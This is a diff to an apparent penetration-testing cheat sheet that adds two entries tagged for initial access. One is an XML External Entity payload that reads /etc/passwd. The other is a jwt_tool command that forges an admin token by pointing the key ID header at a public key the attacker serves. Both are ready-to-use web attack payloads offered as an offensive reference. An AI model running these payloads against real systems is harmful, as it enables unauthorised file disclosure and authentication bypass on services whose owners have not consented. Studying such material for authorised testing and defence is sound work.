@@ -225,6 +225,35 @@ for ip in $(seq 200 254); do echo 1.2.3.${ip}; done > target-ip.txt
 
 ---
 
+# XML External Entity (XXE)
+
+- service: http
+- tactics: enumeration
+- tactics: inital_access
+
+```xml
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+                <foo>
+                <something>&xxe;</something>
+                </foo>
+```
+
+---
+
+# Java-Web-Token (JWT)
+
+- service: http
+- tactics: inital_access
+
+## Sign JWT with own key - might need a webserver serving the private key
+
+```
+python3 jwt_tool.py [eyJ0eXAiOiJKV1QiLCJhbG..snip..] -I -hc kid -hv "http://<IP>/jwt.pub" -pc <admin_cap> -pv <1> -S rs256 -pr jwt.key
+```
+
+---
+
 # ldapsearch
 - service: ldap
 - tactics: discovery
